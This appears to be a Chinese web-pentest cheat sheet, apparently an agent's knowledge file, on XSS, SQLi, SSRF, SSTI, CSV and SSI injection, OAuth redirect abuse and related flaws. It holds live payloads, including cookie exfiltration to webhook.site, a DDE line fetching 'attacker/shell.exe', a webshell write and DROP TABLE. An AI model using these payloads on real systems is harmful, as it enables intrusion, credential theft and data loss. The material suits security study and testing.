# Web 漏洞模式速查

> 漏洞模式速查。每个漏洞类型包含：识别方法、利用思路、关键检查点。

---

## 1. 注入类

### 1.1 XSS（跨站脚本攻击）

**本质**：用户输入被浏览器当作代码执行。

**类型**：
| 类型 | 注入位置 | 触发方式 |
|------|---------|---------|
| 反射型 | URL 参数 → 响应 HTML | 用户点击恶意链接 |
| 存储型 | 用户输入存入数据库 → 其他用户页面 | 任何人访问被注入的页面 |
| DOM 型 | JS 从 URL/输入读取 → 写入 DOM | 用户点击恶意链接 |

**识别方法**：
1. 找反射点：用户输入是否出现在响应 HTML 中？
2. 检查转义：`<` → `&lt;`？`"` → `&quot;`？
3. 检查上下文：在 HTML 标签内？属性内？JS 字符串内？URL 内？
4. 检查 CSP：响应头 `Content-Security-Policy` 是否阻止 inline script？
5. 检查 nonce/hash：`<script nonce="xxx">` 是否必须？

**利用思路**：
- HTML 标签内：`<script>alert(1)</script>`
- 属性内：`" onmouseover="alert(1)" `
- JS 字符串内：`';alert(1);//`
- URL 内：`javascript:alert(1)`
- **Markdown 解析器注入**（详见下文 §1.1.1）
- 绕过 CSP：详见 `$AGENT_DIR/knowledge-base/csp-bypass.md`
- 进阶（上下文矩阵/WAF 绕过/盲打/mXSS/DOM Clobbering/框架 XSS/XS-Leaks）：详见 `$AGENT_DIR/knowledge-base/xss-advanced.md`

**关键检查点**：
- nonce 机制是否可预测/绕过？
- 输入是否经过多个处理层？每一层可能引入不同的转义行为
- 响应的 Content-Type 是否正确？（`text/html` 浏览器才解析）
- 应用是否使用 Markdown 渲染？Markdown 解析器是否允许 HTML 混合或存在 URL 属性注入？

#### 1.1.1 Markdown 解析器注入

**场景**：应用允许用户提交 Markdown 内容并渲染为 HTML（论坛帖子、评论、个人简介等）。

**为什么 Markdown 是 XSS 风险点**：
1. Markdown 的设计目标就是**生成 HTML**，本质上是"用户输入 → HTML 转换器"
2. 许多 Markdown 解析器支持 HTML 混合模式（Markdown 中直接写 HTML）
3. 即使禁用了 HTML 混合，解析器对特殊语法的处理也可能有边界情况

**常见注入方式**：

| 注入方式 | Payload 示例 | 原理 |
|---------|-------------|------|
| HTML 混合模式 | `<img src=x onerror=alert(1)>` | 解析器直接透传 HTML 标签 |
| 图片 alt 文本 | `![alt"><script>alert(1)</script>](url)` | alt 属性未转义 |
| 链接 title | `[link](url "title"><script>alert(1)</script>)` | title 属性未转义 |
| **URL 属性注入** | `![[x](url1)](url2 onerror=alert(1))` | 嵌套结构导致 URL 后的内容被解析为 HTML 属性 |

**URL 属性注入详解**（SnailNet 案例）：

```markdown
![[x](https://webhook.site/?c=)](https://webhook.site//?dummy onerror=this.src=this.src+document.cookie x=)
```

解析器将这个嵌套结构渲染为：

```html
<img src="https://webhook.site//?dummy" onerror="this.src=this.src+document.cookie" x="">
```

`onerror` 属性被成功注入。当图片加载失败时，JavaScript 执行。

**检查清单**：
1. 确认应用是否使用 Markdown 渲染（查看页面源码，HTML 结构是否有 Markdown 解析器的特征）
2. 测试 HTML 混合模式是否开启（提交 `<b>test</b>` 看是否渲染）
3. 测试标准 Markdown 语法中的边界情况（alt text / title / URL 中的特殊字符）
4. 测试嵌套/不标准的 Markdown 语法（解析器的边界处理通常是弱点）
5. 确认渲染后的 HTML 是否存在 CSP 保护

### 1.2 SQL 注入

**本质**：用户输入被拼入 SQL 查询。

**识别方法**：
1. 输入点在查询参数/POST 表单
2. 输入特殊字符（`'` / `"` / `;`）观察错误/行为变化
3. 布尔盲注：`' AND 1=1--` vs `' AND 1=2--` 看响应差异
4. 时间盲注：`' AND SLEEP(5)--` 看响应延迟

**利用思路**：
- UNION 注入：`' UNION SELECT password FROM users--`
- 堆叠注入：`'; DROP TABLE users--`
- 盲注：逐字符提取数据
- ORM 注入：利用 ORM 的 raw query / 排序参数
- 进阶（OOB 带外/各库 RCE/WAF 绕过矩阵/非主流 DB/二阶注入/GraphQL/SQLMap tamper）：详见 `$AGENT_DIR/knowledge-base/sqli-advanced.md`
- NoSQL（MongoDB 操作符注入/`$ne` 认证绕过/`$regex` 盲注/聚合管道 `$lookup`+`$out`/CouchDB/Redis）：详见 `$AGENT_DIR/knowledge-base/nosql-injection.md`
- LDAP（过滤器注入认证绕过/实现差异表/盲注四法/AD UAC 位查询）：详见 `$AGENT_DIR/knowledge-base/ldap-injection.md`

### 1.3 SSRF（服务端请求伪造）

**本质**：让服务器发起请求到攻击者指定的地址。

**识别方法**：
1. 功能点：URL 预览、图片加载、Webhook、文件导入
2. 参数值是 URL 或主机名
3. 测试：`http://127.0.0.1` / `http://localhost` / `http://内网IP`

**利用思路**：
- 访问内网服务（元数据 API / 管理面板）
- 读取本地文件（`file:///etc/passwd`）
- 绕过：IP 进制转换 / DNS Rebinding / URL 解析差异

### 1.4 CRLF 注入 / HTTP 头注入

**本质**：用户输入包含 `\r\n`，注入额外的 HTTP 头或响应体。

**识别方法**：
1. 用户输入出现在响应头中（重定向 URL / Set-Cookie / 自定义头）
2. 测试 `%0d%0a`（`\r\n`）是否能注入新头

**利用思路**：
- 注入 `Set-Cookie` 头
- 注入额外的响应头（CSP / CORS）
- HTTP 请求走私（配合反向代理差异）

### 1.5 iframe Sandbox 逃逸

**场景**：页面使用 `<iframe sandbox="...">` 加载用户可控内容，sandbox 限制了 iframe 内 JS 的能力。目标是让恶意 JS 逃出 sandbox 限制，获得完整的浏览器 API 访问权限。

**sandbox 权限标志含义**：

| 标志 | 允许的行为 | 缺失后果 |
|------|-----------|---------|
| `allow-scripts` | 执行 JS | JS 无法运行（最基本，通常存在） |
| `allow-same-origin` | 保留原始 origin | origin 变为 `null`，无法访问 Cookie/localStorage/同源页面 |
| `allow-popups` | `window.open()` | 无法打开新窗口 |
| `allow-popups-to-escape-sandbox` | 新窗口不受 sandbox 限制 | 新窗口也继承 sandbox 限制 |
| `allow-forms` | 提交表单 | 表单提交被阻止 |

**关键认知**：`allow-same-origin` 和 `allow-scripts` 同时存在时，iframe 内 JS 可以移除 sandbox 属性（通过 `frameElement.removeAttribute('sandbox')`），等于没有 sandbox。所以安全配置通常**只给 `allow-scripts`**，这导致 origin 变为 `null`。

#### 逃逸技术 1：blob URL 作为顶级页面加载

**原理**：在 sandboxed iframe 中创建 blob URL，通过 `window.open` 或重定向使 blob URL 成为顶级页面。blob URL 脱离 iframe 后，sandbox 限制消失。

**blob URL 的 origin 继承**：`blob:` URL 继承创建者的 origin。在 sandboxed iframe 中（origin 为 `null`），创建的 blob URL 的 origin 也是 `null`。但如果应用通过其他方式（如 postMessage）将非 null origin 的 blob URL 传递给 iframe，该 blob URL 具有完整的 origin（详见第 7 节"开放重定向"中的 blob URL origin 继承机制）。

**利用步骤**：
1. 在 iframe 中构造恶意 JS payload
2. JS 创建 blob URL（`URL.createObjectURL(new Blob([payload], {type: 'text/html'}))`）
3. 通过 `window.open(blobUrl)` 或 `location.href = blobUrl` 使 blob URL 成为顶级页面
4. 新页面不受 sandbox 限制，可执行完整 JS（访问 Cookie/localStorage 等）

**条件**：sandbox 包含 `allow-popups`（允许 `window.open`）或存在重定向到 blob URL 的路径。

#### 逃逸技术 2：postMessage 传递 blob URL

**原理**：iframe 中的 JS 通过 `postMessage` 将 blob URL 传给外部页面，外部页面构造重定向使 blob URL 成为顶级页面。本节只描述逃逸的利用方式，blob URL 为什么能通过 origin 检查的原理在第 7 节。

**利用步骤**：
1. 在 sandboxed iframe 中构造恶意 JS
2. JS 将 payload 编码为 blob URL
3. 通过 `window.parent.postMessage(blobUrl, '*')` 发送到父页面
4. 父页面接收后，通过 `location.href = blobUrl` 重定向（或构造 `window.open`）
5. blob URL 作为顶级页面加载，sandbox 消失

**识别方法**：
1. 搜索源码中 `<iframe sandbox` 看权限标志组合
2. 检查 `allow-popups` 和 `allow-same-origin` 的存在情况
3. 查看父页面是否有 `postMessage` 监听器 + 重定向逻辑
4. 检查应用是否有 SSO/OAuth 回调中的 `return`/`redirect` 参数（可与 blob URL 组合）

**检查清单**：
- [ ] sandbox 标志中是否包含 `allow-scripts`（无则无法执行 JS，无逃逸可能）
- [ ] 是否有 `allow-popups`（逃逸技术 1 必要条件）
- [ ] 是否有 `allow-same-origin`（同时有 `allow-scripts` 则等于无 sandbox）
- [ ] 父页面是否有 postMessage → location 重定向链路
- [ ] 应用是否有开放重定向（与 blob URL 组合利用，见第 7 节）

### 1.6 SSTI（服务端模板注入）

**识别**：用户输入被模板引擎渲染，数学探针 `{{7*7}}` 返回 49（非原样回显）= 服务端求值。`{{7*'7'}}` → `7777777`=Jinja2、`49`=Twig。

**要点**：按引擎选 RCE 链（Jinja2 globals 链/MRO 遍历、FreeMarker Execute 类、Twig 按版本 map('system') 等）；无回显用时间盲/OOB（DNS 外带）。`${7*7}`/`%{7*7}` 在 Java 环境求值优先考虑 SpEL/OGNL 表达式注入（不同攻击面）。

**专题**：探针矩阵、各引擎 payload、盲注四技术、CVE 场景（Jira/Spring Cloud Gateway/Struts2/Confluence）、Werkzeug PIN 计算见 `$AGENT_DIR/knowledge-base/ssti.md`。

### 1.7 CSV 公式注入

**攻击链**: 用户输入（资料/工单/备注/文件名）→ 存储 → 导出 CSV/XLSX → 管理员用 Excel/LibreOffice/GSheets 打开 → 单元格按公式求值。
**触发前缀**: `=` `+` `-` `@`；检测先无害算术（`=1+1` 看是否显示计算结果）。
**DDE 命令执行**: `=cmd|'/C powershell IEX(wget attacker/shell.exe)'!A0`｜混淆: 噪声前缀 `AAAA+BBBB&...&cmd|'...'!A`、`=` 后加空白、`rundll32|'URL.dll,OpenURL calc.exe'!A`。
**Google Sheets 外带**: `=IMPORTXML("http://attacker.com/","//a/@href")`｜`IMPORTRANGE` 跨文档拉数据｜`IMPORTDATA/IMPORTFEED/IMPORTHTML` 出站请求。
**sink 排查**: 一切输出 CSV/XLSX/tab 的功能（管理导出/审计日志/名册/账单/搜索结果）。
**防御**: 导出时单元格加 `'` 前缀（强制文本）或 TAB；剥离行首 `=+-@`（含 Unicode 同形字）。

### 1.8 SSI 注入

**前提**: Apache mod_include + `Options +Includes` + .shtml（或 AddOutputFilter）；Nginx `ssi on;`；IIS SSI 特性。
**探针**: `<!--#echo var="DATE_LOCAL"-->` → 响应含当前日期 = SSI 生效。
**Payload**: 命令 `<!--#exec cmd="id"-->`｜包含 `<!--#include virtual="/etc/passwd"-->`｜写马链 `<!--#exec cmd="echo '<?php system($_GET[c]);?>' > shell.php"-->`。
**测试位**: 留言板/评论/含输入的错误页/上传 .shtml。与 SSTI 区分: SSI 是 Web 服务器层解析。

### 1.9 XPath 注入

**脆弱形**: `$xml->xpath("/user[username='$u' and password='$p']")`。
**认证绕过**: `admin' or '1'='1` / `anything' or '1'='1`（恒真返回首用户）。
**盲注七步**: count(/)→name(//*[1]) 逐字符→count(/accounts/user)→子元素名→属性枚举→string-length(//user[1]/password)→substring 逐字符。函数: string-length/substring/count/name/contains/starts-with；XPath 2.0 加 matches(regex)/lower-case/tokenize。
**防御**: 参数化 XPath；过滤 `' " ( ) / [ ] : * =`。

### 1.10 LaTeX 注入

**场景**: 论文生成器/PDF 报告/公式渲染编译用户 LaTeX。
**文件读**: `\input{/etc/passwd}`、`\lstinputlisting{/etc/passwd}`。
**RCE**: `\immediate\write18{id > /tmp/o}` + `\input{/tmp/o}`（需 --shell-escape）；`\input{|id}`（部分引擎）。
**客户端 XSS**: MathJax/KaTeX 部分版本 `\href{javascript:alert(1)}{click}`。
**探测**: `$\frac{1}{2}$` 渲染确认 → 文件读 → write18。

---

### 1.11 XML 注入（头构建）
服务端把头值拼进 XML 不转义: `X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1` ——解析器取首个 <admin>（first-match 语义）。任何进 XML 构建器的头（XFF/UA/Referer）都测标签闭合注入。


## 2. 认证/会话类

### 2.1 Cookie 安全

**关键属性检查**：
| 属性 | 作用 | 缺失风险 |
|------|------|---------|
| `HttpOnly` | JS 无法读取 | XSS 可窃取 Cookie |
| `Secure` | 仅 HTTPS 传输 | 中间人可截获 |
| `SameSite` | 跨站请求限制 | CSRF 攻击 |
| `Path` | Cookie 作用路径 | 路径越宽越危险 |
| `Domain` | Cookie 作用域名 | 域名越宽越危险 |

**利用思路**：
- `httpOnly: false` → XSS 可读 Cookie（`document.cookie`）
- `SameSite=None` → 跨站请求带 Cookie（CSRF + 缓存投毒）
- `Path=/` → 所有路径都能访问

### 2.2 JWT（JSON Web Token）

> 攻击全景（jwk/jku/kid 头部注入、JWE 公钥伪造、CRC32 cookie 截断、余额重放）见 `$AGENT_DIR/knowledge-base/jwt-attacks.md`；认证攻击全景见 `$AGENT_DIR/knowledge-base/auth-attacks.md`。

**识别方法**：
1. 认证 Token 格式为 `xxx.yyy.zzz`（Base64 编码的三段）
2. 解码第一段看 `alg` 字段

**常见漏洞**：
| 漏洞 | 检测方法 |
|------|---------|
| `alg: none` | 修改 alg 为 none，删除签名，看是否通过 |
| 弱密钥 | 用 jwt-tool / hashcat 暴力破解密钥 |
| RS256→HS256 混淆 | 用公钥作为 HMAC 密钥签名 |
| kid 注入 | kid 参数注入路径遍历 |

### 2.3 CORS（跨域资源共享）

> 深度参考见 `$AGENT_DIR/knowledge-base/cors-misconfiguration.md`（null origin/正则绕过 payload/Vary Origin 缓存投毒/内网 CORS+DNS rebinding/JSONP 劫持/document.domain）。

**识别方法**：
1. 发送 `Origin: https://evil.com` 头
2. 检查响应中 `Access-Control-Allow-Origin` 是否反射
3. 检查 `Access-Control-Allow-Credentials: true`

**利用思路**：
- `ACAO: *` + `ACAC: true` → 任意域读取数据（浏览器实际阻止这种组合）
- `ACAO: https://evil.com` + `ACAC: true` → evil.com 可读取用户数据
- `null` Origin → iframe sandbox 可触发

### 2.4 CSRF（跨站请求伪造）

> 深度参考见 `$AGENT_DIR/knowledge-base/csrf-clickjacking.md`（token 缺陷三类/SameSite=Lax 绕过五法/JSON CSRF 四法/OAuth state/CSRF+CORS 链/CSPT2CSRF/clickjacking）。

**识别方法**：
1. 状态变更端点（改密/改邮箱/转账/授权）的请求中找 CSRF token
2. 检查会话 cookie 的 `SameSite` 属性
3. 检查 CORS 是否 `ACAC: true` + 反射 Origin（JSON CSRF 前提）

**利用思路**：
- 删除 token 参数 / 换随机值 / 跨用户 token → 服务端未真正校验
- `SameSite=Lax` 绕过：GET 状态变更 / 子域 XSS / 2 分钟豁免 / 302 链 / `_method` override
- JSON 端点：`text/plain` 表单伪装（`enctype="text/plain"` + name 构造 JSON 体）
- OAuth 无 `state` → 授权码 CSRF → 账号绑定劫持

### 2.5 加密 Token/Cookie 密码学攻击

> 深度参考见 `$AGENT_DIR/knowledge-base/web-crypto-attacks.md`（Padding Oracle+PadBuster 官方参数表/CBC bit-flip 实操/弱随机数时间戳爆破+php_mt_seed/hashpump CLI/方向决策表）。

**识别方法**：
1. 密文反馈差异（200 vs 500）→ Padding Oracle
2. 密文含可辨识明文结构（role=user）→ CBC bit-flip
3. Token 以 eyJ 开头 → JWT（见 §2.2）；短 Token 基于时间戳 → 弱随机数爆破
4. `sign=md5hash` 类参数且 secret 前置拼接 → 哈希长度扩展

---

## 3. 缓存类

> 详细分析见 `$AGENT_DIR/knowledge-base/cache-poisoning.md`。

### 3.1 Web Cache Poisoning（缓存投毒）

**核心问题**：攻击者的输入被缓存，其他用户收到被投毒的响应。

**关键检查**：
1. 是否有缓存？（X-Cache 头 / 响应时间差异）
2. 缓存键包含什么？（URL / Host / Vary 头）
3. 攻击者能控制键外的内容吗？（未键入的输入被缓存）

### 3.2 Web Cache Deception（缓存欺骗）

**核心问题**：缓存把包含敏感数据的响应当作静态资源缓存。

**关键检查**：
1. 路径混淆：`/api/user-data/xxx.css` → 缓存认为是 CSS，服务器返回用户数据
2. 缓存规则：只看路径后缀？还是看 Content-Type？

---

## 4. 文件类

### 4.1 LFI/RFI（本地/远程文件包含）

**识别方法**：
1. 参数包含文件路径（`?page=about` / `?file=download`）
2. 测试路径遍历：`../../etc/passwd`

**利用思路**：
- 读取敏感文件（配置/日志/源码）
- 日志注入：在 User-Agent 中注入 PHP 代码，然后包含日志文件
- PHP 协议：`php://filter/convert.base64-encode/resource=index.php`

### 4.2 文件上传

> 深度参考见 `$AGENT_DIR/knowledge-base/file-upload.md`（四阶段模型/解析漏洞/处理链/云存储/竞争条件）。

**识别方法**：
1. 文件上传功能点
2. 检查：文件类型限制？文件名处理？存储路径？

**利用思路**：
- 双扩展名：`shell.php.jpg`
- MIME 类型欺骗：修改 Content-Type
- 路径遍历：`../../../var/www/html/shell.php`
- 竞争条件：上传→快速访问→利用

---

## 5. 逻辑类

### 5.1 IDOR（不安全的直接对象引用）

> Web 权限提升全景（Mass Assignment 字段清单/管理端点绕过/SPA 前端鉴权绕过/邀请接口提权）见 `$AGENT_DIR/knowledge-base/web-privesc.md`。

**识别方法**：
1. URL/API 中有 ID 参数（`/api/user/123`）
2. 修改 ID 看能否访问其他用户的数据

**利用思路**：
- 枚举 ID（数字/UUID）
- 批量请求
- 批量 ID 修改

### 5.2 条件竞争

**识别方法**：
1. 功能涉及：余额检查→扣款 / 库存检查→下单 / 优惠券使用
2. 多次并发请求同一操作

**利用思路**：
- 并发请求打时序差: python 线程池/aiohttp 并发同一端点
- 时间窗口内的双重使用
- TOCTOU（检查时间/使用时间不一致）
- **Barrier 同步并发 + 签名 cache-bust**: `if counter < 4` 检查先于自增时——multiprocessing Barrier(N) 全体对齐后同时发出，全部在任一自增前过检查；每请求对签名做无害变形（nonce 前补零）防服务端缓存验证结果绕过竞争窗口

### 5.3 Middleware CT 覆盖漏洞

**场景**：框架中间件（如 Next.js middleware）允许请求中的 `Content-Type` 头覆盖响应的 Content-Type。

**漏洞模式**：

```typescript
// 危险：middleware 允许请求 CT 覆盖响应 CT
const contentType = request.headers.get('content-type');
if (contentType) {
  response.headers.set('Content-Type', processCT(contentType));
}
```

**利用条件**：
1. 应用有中间件处理 CT
2. 中间件允许 `text/html` 作为覆盖值
3. 响应内容中存在未转义的用户输入（如 nonce 反射）

**利用步骤**：
1. 发送请求带 `Content-Type: text/html` 头
2. 同时利用反射点注入 XSS（如通过 `x-nonce` 头注入 `<script>` 标签）
3. 响应 CT 被覆盖为 `text/html`
4. 浏览器将响应内容（可能是 flight data 等非 HTML 格式）当 HTML 解析
5. 未转义的内容中的 `<script>` 标签被执行

**案例**：某 Next.js 实战中 middleware 允许 CT 覆盖，flight data 中未转义的 nonce 值被浏览器当 HTML 解析执行。

**安全写法**：

```typescript
// 安全：白名单验证，禁止覆盖为 text/html
const allowedCTs = ['application/json', 'text/plain'];
const contentType = request.headers.get('content-type');
if (contentType && allowedCTs.includes(contentType.split(';')[0].trim())) {
  response.headers.set('Content-Type', contentType);
}
```

**检查清单**：
- [ ] 搜索 middleware 中的 `Content-Type` 处理逻辑
- [ ] 是否允许请求头覆盖响应 CT？
- [ ] 是否验证 CT 值的白名单？
- [ ] 响应内容中是否有未转义的用户输入？

### 5.4 编码归一化身份混淆

**双视图缝隙**: 检查用视图 A（原始输入）、生效用视图 B（归一化后）。
- **NFKC 归一化**: 注册 `ⓐdmin`/`Ａdmin`（全角）→ 检查后归一为 `admin`（注册/密码重置场景）
- **Punycode 同形字**: `аpple.com`（西里尔 а）视觉同形 → 钓鱼/重定向过滤绕过/SSRF 域名校验绕过
- **MySQL collation**: utf8_general_ci 下 `'ᵃdmin'`(U+1D43) 匹配 `'admin'` → 注册等价名接管（用前 `SELECT 'a'='ᵃ'` 探 collation）
- **Base64 歧义**: WAF 与应用解码器实现差异，畸形 padding 过 WAF 仍被应用解码
与注入场景 Unicode 规范化（绕引号过滤，见 §1.2）互补；Ghost Bits 双视图同构。

---

### 5.5a 逻辑漏洞补充三则
- **编码破坏报错**: 编码参数（base64/URL/hex/JWT）加前缀/截断/非法字符/双编码触发详细报错——泄露路径/密钥/库结构
- **购物车价格篡改**: cart 参数含 price/数量/币种且服务端信任客户端值——改 0/负数、负数量、币种切换、负折扣
- **用户名枚举**: "Invalid username" vs "Invalid password" 文案差/时间差（存在用户走完整哈希）/锁定提示/注册冲突提示
- **多步流程步骤跳过**: 服务端只在末步做业务动作不校验流程状态机——记录全流程请求后单独重放末步 API（跳过手机验证/实名认证/支付确认）。**唯一性绕过**: 注册/领券接口重复提交绕过前端唯一性检查（后端无唯一约束或 upsert 语义）。

### 5.5 校验与使用不一致六型
strpos 子串黑名单（换目标文件即过）｜(int) 前缀转换后校验、拼接原始串（`-41.../../../admin`）｜正则缺 $ 尾锚（前缀匹配后缀注入）｜多斜杠 `///path` 绕 startswith（解析器归一、字符串比对不归一）｜basename() 只剥目录不滤隐藏文件（.lock/.htaccess/file~）｜字符串等值拦 + 路径归一化达目标（`/../gamesim_GM`）。**第七型——JSON \u 转义层差**: 黑名单/正则检查**原始 body 字节**、下游用 `json_decode` 后的值时，payload 全字符 `\uXXXX` 转义——`{"page":"\u0070\u0068\u0070://filter/..."}` 原文无 php/flag 字面量，解码后完整恢复（校验层只见转义形态）。

### 5.6 浮点精度经济漏洞
交易/经济游戏（买卖+fee+阈值）存在大倍率操作时——decimal×1e15 级乘法产生非对称舍入小数尾巴: 卖 `int(x*mult)` 整数部分留 0.06 级"免费库存"过 fee 阈值，同时余额舍入恰好凑目标价。枚举 x=i/100 找 `frac(x*mult)>0` 候选（0.07/0.14/0.27/0.56 常见）。识别: 题面提 time travel/amplify/小数货币+fee/正常数学无解/强制整数交易。JS 侧同族: `x=2^53` 时 IEEE754 使 `x+1===x`——任何断言 `n!==n+1` 的数值检查在浮点边界坍缩，试 2^53/Infinity/NaN/-0 组合。

### 5.7 服务端游戏校验缺位三型
①cookie 即存档: 进度在 session cookie——猜测前存 `cookies.get_dict()`，失败 clear+update 恢复，免重置爆破; ②只验时间不验行为: start 端点开局→sleep 所需时长→直接调 win 端点（先枚举 API 能否脱离客户端直调）; ③客户端状态可信: JS console 改 `player.x/y` 后调观察到的验证函数 `verifyProgress(x,y)`; 谜语提示常以协议名/默认端口/ASCII 值编码目标坐标（mosquito→MQTT→1883）。共性: 先问"服务端到底验证了什么"。Flask 签名 cookie 直读工具: flask-unsign。

## 6. 反向代理/基础设施类

### 6.1 HTTP 请求走私

**本质**：前端代理和后端服务器对请求边界的解析不一致。

**类型**：
| 类型 | 方式 |
|------|------|
| CL.CL | 两个 Content-Length |
| CL.TE | Content-Length + Transfer-Encoding |
| TE.CL | Transfer-Encoding + Content-Length |
| TE.TE | 两个 Transfer-Encoding（混淆） |

**检测方法**：发送精心构造的请求，观察响应延迟/内容差异。

### 6.2 Host 头攻击

**识别方法**：
1. 修改 Host 头看服务器如何使用
2. 检查：密码重置链接 / 缓存键 / 虚拟主机路由

**利用思路**：
- 密码重置链接中毒
- 缓存投毒（Host 是缓存键的一部分）
- SSRF（Host 被用于反向代理上游请求）
- 校验绕过全集/hop-by-hop 滥用/CRLF 进阶：详见 `$AGENT_DIR/knowledge-base/host-header-attacks.md`

---

## 7. 开放重定向与 URL 验证绕过

**场景**：SSO/OAuth 回调中的 `return`/`redirect` 参数、登录后的跳转 URL 等，服务端通常做 origin 检查，只允许同域跳转。

> SSO 审计的完整攻击编排流程（含 iframe sandbox 逃逸 + blob URL 组合利用），见 `$AGENT_DIR/knowledge-base/attack-orchestration.md` §4。

### 典型验证逻辑

```javascript
// 服务端验证回调 URL 的 origin
const candidate = req.query.return;
if (new URL(candidate).origin === window.location.origin) {
  redirect(candidate);  // 安全？不一定
}
```

### blob URL 绕过（核心）

**关键特性**：`new URL('blob:https://example.com/uuid-1234').origin` 返回 `'https://example.com'`。

blob URL 继承创建者的 origin。当页面 `https://example.com` 上执行 `URL.createObjectURL(blob)` 创建的 blob URL，其 origin 为 `https://example.com`，能通过同域检查。

**利用步骤**：
1. 在目标域上找到可注入 JS 的位置（XSS/Markdown 注入等）
2. 构造恶意页面内容，生成 blob URL
3. 将 blob URL 作为 `return` 参数传递给 SSO/OAuth 回调
4. 服务端验证 `new URL(blobUrl).origin === 'https://example.com'` → **通过**
5. 用户被重定向到 blob URL，恶意 JS 在目标域的 origin 下执行

**与其他漏洞的组合**（与第 1.5 节 sandbox 逃逸的关系）：
- 1.5 节的逃逸技术需要让 blob URL 成为顶级页面来脱离 sandbox
- 本节的开放重定向是"让 blob URL 成为顶级页面"的一种手段
- blob URL 继承创建者 origin 的特性是两者共同的基础

### 其他绕过方式

| 方式 | URL 示例 | `new URL().origin` | 说明 |
|------|---------|-------------------|------|
| `javascript:` | `javascript:alert(1)` | `"null"` | 仅在 `=== null` 比较时可能绕过 |
| `data:` | `data:text/html,<script>alert(1)</script>` | `"null"` | 同上 |
| `@` 混淆 | `https://evil.com@good.com/` | `"https://good.com"` | origin 是 `@` 后的域名 |
| 协议降级 | `http://good.com.evil.com/` | `"http://good.com.evil.com"` | 依赖子域名控制 |

### 通用开放重定向速查（过滤绕过与利用链）

**高频参数名**：`url redirect next dest destination redir return returnUrl go forward target out continue link view to ref callback path rurl`。Sink：服务端 `header("Location:")`/`sendRedirect`/`res.redirect`；客户端 `window.location(.href/.replace)`/`window.open`。

**过滤绕过**：
| 校验 | 绕过 |
|---|---|
| 只允许 `/` 开头 | `//evil.com`（协议相对） |
| 检查包含 trusted.com | `evil.com?trusted.com`、`trusted.com.evil.com` |
| 必须 `https://trusted.com` 开头 | `https://trusted.com@evil.com`（userinfo） |
| 正则 `^/[^/]` | `/\evil.com`（浏览器把 `\` 归一化为 `/`） |
| Django `endswith('target.com')` | `http://evil.com/www.target.com` |
| 域名后缀白名单 | 白名单域子域接管（`*.trusted.com` 悬挂） |
| 混淆 | `evil.com#@trusted.com`（fragment）、`trusted.com%00@evil.com`、`java%09script:`（TAB） |

**OAuth token 窃取**（redirect_uri 指向授权域内开放重定向端点时）：
- Implicit：token 在 fragment → `redirect_uri=target.com/callback/../redirect?url=evil.com` → 跳转后 `evil.com#access_token=SECRET`，攻击页读 `location.hash`。
- Code flow：`redirect_uri=...callback%2f..%2fredirect%3furl%3devil.com`（前缀校验通过）→ `evil.com?code=AUTH_CODE` → 换 token。
- redirect_uri 绕过 5 式：`/../open-redirect?url=`（遍历）｜`?next=`（query）｜`%23@evil.com`（编码#+userinfo）｜`/../../redirect`（多重遍历）｜`#@evil.com`（fragment）。

**其他链**：钓鱼放大（受信域跳板）｜CSRF Referer 绕过（重定向保持 trusted.com Referer）｜SSRF 多跳（`attacker.com/r1→302→r2→302→169.254.169.254`，过滤不重检跳转目标）｜协议升级（302 → `gopher://127.0.0.1:6379`/`file:///etc/passwd`/`dict://`，curl 默认跟随）。

**Reverse Tabnabbing**：`target="_blank"` 无 `rel="noopener noreferrer"` 时新页可 `window.opener.location = "phishing.com/fake-login"`（现代浏览器已默认隐式 noopener，旧浏览器/WebView 适用）。排查用户生成内容外链。

### 识别方法

1. 搜索源码中的 `redirect`、`return`、`callback`、`next` 参数
2. 搜索 `window.location.assign`、`window.location.replace`、`location.href =`
3. 搜索 `new URL(candidate).origin` 检查逻辑
4. 检查 SSO/OAuth 登录流程的回调 URL 处理

### 检查清单

- [ ] 找到所有用户可控的跳转 URL 参数
- [ ] 验证逻辑是否只检查 `origin`（blob URL 可绕过）
- [ ] 是否允许 `javascript:` 或 `data:` 协议
- [ ] 跳转目标是否作为顶级页面加载（sandbox 逃逸的利用路径）
- [ ] **协议白名单**：验证逻辑是否要求协议为 `http:` 或 `https:`（拒绝 `blob:`）
- [ ] **hash 参数**：回调 URL 是否也从 URL hash（`#return=xxx`）中读取（额外的绕过点）

---

## 8. Markdown 解析器安全测试方法论

### 8.1 系统化测试流程

```
阶段 1：基础探测
  ├── 提交纯文本 → 确认渲染正常
  ├── 提交标准 Markdown → 确认语法支持
  └── 检查 HTML 混合模式：提交 <b>test</b> → 是否被渲染为加粗？

阶段 2：HTML 混合模式测试（如果开启）
  ├── <img src=x onerror=alert(1)>  → 直接 XSS
  ├── <script>alert(1)</script>     → 直接 XSS
  └── 如果这里能 XSS，不需要继续测试

阶段 3：标准语法边界测试
  ├── 图片 alt 文本注入：![alt"><script>alert(1)</script>](url)
  ├── 链接 title 注入：[link](url "title"><script>alert(1)</script>)
  ├── 代码块逃逸：```代码块内注入```
  └── 检查每个语法元素是否正确转义特殊字符

阶段 4：嵌套/非标准结构测试（重点！）
  ├── 嵌套方括号：![[x](url1)](url2 extra_attrs)
  ├── 未闭合的方括号/圆括号
  ├── URL 中的空格和特殊字符
  └── 解析器的边界处理通常是弱点

阶段 5：确认 CSP 保护
  ├── 响应中是否有 Content-Security-Policy 头？
  ├── CSP 是否阻止内联脚本和内联事件处理器？
  └── 如果有 CSP，需要结合 CSP 绕过技术
```

### 8.2 常见解析器漏洞模式

| 漏洞 | Payload 示例 | 原因 |
|------|-------------|------|
| URL 属性注入 | 见 §1.1.1 详解 | 解析器把 URL 后的内容当作 HTML 属性 |
| alt 属性注入 | `!["><script>alert(1)</script>](url)` | alt 文本未转义 `"` 和 `<` |
| href 属性注入 | `[link](javascript:alert(1))` | URL 未过滤 `javascript:` 协议 |
| HTML 混合 | `<img src=x onerror=alert(1)>` | 解析器直接透传 HTML |

### 8.3 PHP 自定义 Markdown 解析器特有问题

自定义 Markdown 解析器（非标准库）通常有更多边界问题：

```php
// 典型的有漏洞模式：先全局 htmlspecialchars，再用正则替换
$text = htmlspecialchars($text, ENT_QUOTES, 'UTF-8');  // 转义所有 HTML
$text = preg_replace_callback('/!\[(.*?)\]\((.*?)\)/', function($m) {
    // 正则匹配后再处理，可能引入新的注入点
    $url = safe_markdown_url(htmlspecialchars_decode($m[2])); // 解码后再处理
    return '<img src="' . $url . '" ...>';
}, $text);
```

**关键问题**：`htmlspecialchars_decode` 撤销了之前的转义，然后在正则替换中可能产生新的注入机会。

### 8.4 检查清单

